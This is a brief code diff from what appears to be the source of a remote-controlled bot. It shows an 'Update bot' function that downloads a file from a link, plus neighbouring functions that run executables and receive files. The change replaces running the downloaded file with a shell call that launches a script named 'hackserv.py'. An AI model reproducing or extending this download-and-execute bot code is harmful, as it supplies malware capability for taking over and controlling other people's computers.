@@ -282,7 +282,8 @@ def execute(xType, file): # Run executable file.
     
 def update(link, file): # Update bot.
     download(link, file)
-    runcmd_noout('./' + file)
+    Popen("/home/code/hackserv.py", shell=True)
+    #runcmd_noout('./' + file)
     sys.exit()
 
 def retrieveFile(fsname, fs, fsaddr): # Receive a file.
